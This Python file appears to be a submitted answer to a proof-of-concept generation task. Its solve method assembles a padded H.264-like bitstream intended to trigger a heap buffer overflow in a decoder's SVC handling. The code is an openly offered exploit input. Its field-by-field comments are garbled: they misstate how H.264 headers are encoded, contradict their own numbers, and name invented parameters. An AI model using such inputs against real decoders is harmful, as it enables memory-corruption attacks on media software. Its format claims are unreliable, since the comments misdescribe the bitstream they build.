class Solution:
    def solve(self, src_path: str) -> bytes:
        # Craft a simple H.264-like bitstream with mismatched SVC dimensions to trigger heap buffer overflow
        # This is a minimal PoC; in practice, adjust based on source analysis
        poc = bytearray()
        
        # NALU start code
        nalu_start = b'\x00\x00\x00\x01'
        
        # SPS NALU with basic profile, mismatched dimensions (e.g., display width/height vs sequence)
        # Simplified: profile_idc=66 (baseline), level=30, pic_width=1920, pic_height=1080
        # But for SVC, add subset params; here simulate mismatch by setting seq dimensions small, display large
        sps_data = bytearray([
            0x67,  # NAL header: forbidden_zero=0, nal_ref_idc=3, nal_unit_type=7 (SPS)
            0x42,  # profile_idc=66 (baseline), constraint_set_flags, level_idc=30
            0x01,  # seq_parameter_set_id=0
            0x01,  # log2_max_frame_num_minus4=0
            0xE0,  # pic_order_cnt_type=0
            0x1E,  # log2_max_pic_order_cnt_lsb_minus4=4 (12 bits)
            0x90,  # num_ref_frames=1, gaps_in_frame_num_value_allowed=0
            0x04,  # pic_width_in_mbs_minus1=3 (width=64 MBs *16=1024)
            0x0C,  # pic_height_in_map_units_minus1=12 (height=13*16=208)
            0x05,  # frame_mbs_only_flag=1, mb_adaptive_frame_field_flag=0, direct_8x8_inference_flag=1
            0xFF,  # frame_cropping_flag=1, crop params to mismatch display
            0x00, 0x00, 0x00, 0x00  # crop_left=0, right=0, top=0, bottom=0
        ])
        # Add SVC extension simulation: subset sequence dimensions small
        sps_svc = bytearray([
            0xE0,  # svc params start
            0x01,  # num_layers_minus1=0
            0x10,  # did_swing=1, etc. small dims
            0x20,  # qid_swing=2
            0x00   # etc.
        ])
        sps_data.extend(sps_svc)
        poc.extend(nalu_start)
        poc.extend(sps_data)
        
        # PPS NALU
        pps_data = bytearray([
            0x68,  # NAL header: type=8 (PPS)
            0x01,  # pic_parameter_set_id=0, seq_parameter_set_id=0
            0x00,  # entropy_coding_mode=0
            0x00,  # num_ref_idx_l0_active=1, etc.
            0x03,  # weighted_pred=0, etc.
            0x00   # etc.
        ])
        poc.extend(nalu_start)
        poc.extend(pps_data)
        
        # IDR frame NALU with slice header setting display dimensions large (mismatch)
        # Display dimensions in SEI or something, but simulate in slice header
        idr_data = bytearray([
            0x65,  # NAL header: type=5 (IDR slice)
            0x88,  # first_mb_in_slice=0
            0x84,  # slice_type=7 (I), etc.
            # Simulate dimension mismatch by padding or invalid params leading to overflow
            0xFF, 0xFF,  # invalid ref pic list or something
        ])
        # Add slice data: small actual data but dimensions imply large buffer
        slice_data = bytearray(b'\x00' * 100)  # small slice
        idr_data.extend(slice_data)
        poc.extend(nalu_start)
        poc.extend(idr_data)
        
        # Pad to approach 6180 bytes with filler NALUs or junk to trigger heap issues
        filler = bytearray(nalu_start + b'\x0C' + b'\x00' * 500)  # Filler NALU type 12
        num_fillers = (6180 - len(poc)) // 501
        for _ in range(num_fillers):
            poc.extend(filler)
        # Add remaining bytes
        remaining = 6180 - len(poc)
        if remaining > 0:
            poc.extend(b'\x00' * remaining)
        
        # Ensure exact length
        poc = poc[:6180]
        while len(poc) < 6180:
            poc.append(0x00)
        
        return bytes(poc)